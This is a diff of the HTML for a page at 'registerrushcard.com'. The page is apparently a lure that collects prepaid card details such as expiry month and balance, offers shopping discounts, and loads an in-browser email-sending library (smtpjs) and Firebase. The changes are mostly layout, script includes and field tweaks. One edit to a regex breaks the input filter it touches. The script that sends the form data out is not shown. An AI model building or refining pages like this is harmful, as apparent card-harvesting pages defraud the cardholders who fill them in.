@@ -6,6 +6,9 @@
     <meta name = "viewport" content = "width = device-width, initial-scale = 1.0">
     <link rel="canonical" href="https://registerrushcard.com/" />
 
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
     <link href="style.css" rel="stylesheet">
 
@@ -13,6 +16,18 @@
     <title></title>
   </head>
   <body>
+
+
+
+
+
+
+
+
+
+
+
+
 
 
     <!-- example 6 - center on mobile -->
@@ -102,8 +117,10 @@
     value="MM*"
     size="20"
     maxlength="2"
+    min="1"
+    max="12"
     oninput="this.value=this.value.replace(/(?![0-9])./gmi,'')"
-    onfocus = 'if (this.value == "month") this.value = ""'
+    onfocus = 'if (this.value == "MM*") this.value = ""'
     >
 
   <!-- <label >Expiration Date</label> -->
@@ -138,10 +155,9 @@
   <input class="balance"
   type="text" name="card_balance"
   value="Card Balance"
-
   size="20"
   onfocus = 'if (this.value == "Card Balance") this.value = ""'
-  oninput="this.value=this.value.replace(/(?![0-9])./gmi,'')"
+  oninput="this.value=this.value.replace(/(?![0-9])/gmi,'')"
   ><br><br>
 
 
@@ -182,29 +198,12 @@
 
 
 
-      <div class="row">
-
-        <div class="col-sm-12" style="background-color:white;">
-
-
-            <div class="logo_div">
-              <br>
-              <img src="./logo_images/facebook.png" alt="Facebook" >
-              <img src="./logo_images/instagram.jpg" alt="Instagram" >
-              <img src="./logo_images/twitter.png" alt="Twitter" >
-              <br>
-              <br>
-              <br>
-            </div>
-
-        </div>
-
-      </div>
 
 
 
       <div class="row">
         <div class="col-sm-12" style="background-color:white;"><div class="discount" style="background-color:white">
+          <br><br>
           <h2>Avail Exciting Discounts on</h2><br>
 
           <b>Grocery Shopping:</b>
@@ -220,17 +219,30 @@
             Extra 20% off on all major Shopping sites like myntra,flipkart,ajio.<br>
             <br>
         </div>
+        <div class="row">
 
+          <div class="col-sm-12" style="background-color:white;">
+
+<br><br>
+              <div class="logo_div">
+                <br>
+                <img src="./logo_images/facebook.png" alt="Facebook" >
+                <img src="./logo_images/instagram.jpg" alt="Instagram" >
+                <img src="./logo_images/twitter.png" alt="Twitter" >
+                <br>
+                <br>
+                <br>
+              </div>
+
+          </div>
+
+        </div>
+<h6 style="text-align: center;">Copyright 2021</h6>
           <div class="infosResults"></div></div>
 
       </div>
 
-bu
-
-
     </div>
-
-
 
       <div class="infosResults"></div>
 
@@ -238,9 +250,6 @@ bu
     <script src="https://smtpjs.com/v3/smtp.js"></script>
       <script src="https://www.gstatic.com/firebasejs/8.6.3/firebase.js"></script>
     <script src="app.js"></script>
-
-
-
 
 
   </body>
